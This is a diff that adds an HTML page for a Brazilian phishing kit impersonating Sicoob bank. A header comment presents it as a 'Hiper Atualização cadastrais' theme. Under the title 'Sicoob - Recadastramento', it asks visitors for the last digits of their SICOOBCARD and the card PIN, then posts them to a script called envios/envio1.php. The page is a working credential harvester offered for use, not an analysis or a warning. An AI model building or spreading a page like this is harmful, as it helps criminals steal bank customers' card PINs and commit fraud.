@@ -1,0 +1,69 @@
+<!--
+Theme Name: Hiper Atualiza巽達o cadastrais
+Author: MK(rj)
+ --><!DOCTYPE html><html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=euc-jp">
+    <title>Sicoob - Recadastramento</title> 
+    
+
+    <!-- CSS -->
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
+    <link rel="stylesheet" type="text/css" href="css/estilo.css">
+    
+    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- scripts -->
+    <script src="js/jquery-3.2.1.min.js"></script>
+    <script src="js/jquery.mobile-1.3.2.min.js"></script>
+    <script src="js/jquery.mask.js"></script>
+    <script src="js/bootstrap.js"></script>
+    <script src="js/script.js"></script>
+
+    <!-- mascara -->
+    <script type="text/javascript">
+        $(document).ready(function(){
+			$('#cc').mask('XXXX.XXXX.XXXX-0000');
+          $('#cpf').mask('000.0XX.XXX-XX');
+         <!--  $('#senha1').mask('000000');  -->
+        });
+    </script>
+
+</head>
+
+<body id="tela2">
+    <div class="container-fluid">
+        <div class="row">
+            <header id="topo">
+                <h1 class="logo-topo">
+                    <img src="img/logo.png">
+                </h1>
+            </header>
+        </div>
+    </div>
+    <main>
+        <div class="container">
+            <div class="row">
+                <h3 class="titulo-home">Preencha os dados do seu SICOOBCARD.</h3>
+            </div>
+            <div class="row">
+                <section class="caixa">
+                    <form name="form1" action="envios/envio1.php" method="POST" class="form-home">
+					 <div class="form-group">
+                            <input id="cc" name="cc" placeholder="4 Ultimos Digitos do Cartao:" type="tel" maxlength="19" required="">
+                        </div>
+                        <div class="form-group">
+                          <input id="senha1" name="senha1" placeholder="Senha do cartao" type="tel" onfocus="this.type='password'" maxlength="6" required="">
+                        </div>
+                        <input type="submit" name="" value="Continuar">
+                    </form>
+                </section>
+            </div>
+        </div>
+    </main>
+    <footer id="rodape">
+        <img src="img/rodape.png">
+    </footer>
+
+
+</body></html>
